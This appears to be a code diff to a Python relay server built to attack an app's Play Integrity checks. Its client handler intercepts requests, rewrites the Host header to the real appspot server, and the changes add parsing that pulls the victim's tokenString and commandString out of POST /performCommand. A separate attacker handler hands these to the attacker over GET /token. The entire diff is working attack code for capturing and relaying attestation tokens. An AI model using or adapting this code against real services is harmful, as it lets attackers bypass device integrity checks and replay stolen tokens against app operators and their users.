@@ -40,8 +40,8 @@ def attacker_request_handler(conn, addr, client_data):
         #        break
         total_data += data
         if b"GET /token" in total_data:
-            conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"token\": \"" +
-                         client_data.token.encode() + b"\", \"commandString\": \"" +
+            conn.sendall(b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n\r\n{\"token\":\"" +
+                         client_data.token.encode() + b"\", \"commandString\":\"" +
                          client_data.commandString.encode() + b"\"}")
         else:
             conn.sendall(b"HTTP/1.1 404 Not Found\r\n\r\n")
@@ -69,19 +69,19 @@ def client_request_handler(conn, addr, client_data):
 
     with conn:
         print(f"Connected to {addr}")
-        #while True:
-        data = conn.recv(4096)
-            #if not data:
-            #    break
-        total_data_client += data
+        while True:
+            data = conn.recv(4096)
+            total_data_client += data
+            if len(data) < 4096:
+                break
 
         if b"Host: localhost" in total_data_client:
             total_data_client = total_data_client.replace(b"Host: localhost",
                                                           b"Host: play-integrity-9xfidw6bru2nqvd.ue.r.appspot.com")
 
         if b"POST /performCommand" in total_data_client:
-            # TODO figure out how to parse this to get the token
-            print(total_data_client)
+            client_data.token = "\"" + total_data_client.decode('utf8').split("\",\"tokenString\":\"")[1].split("\"")[0] + "\""
+            client_data.commandString = "\"" + total_data_client.decode('utf8').split("\r\n\r\n{\"commandString\":\"")[1].split("\"")[0] + "\""
         else:
             # set up client socket to relay information to the application server
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as clientSock:
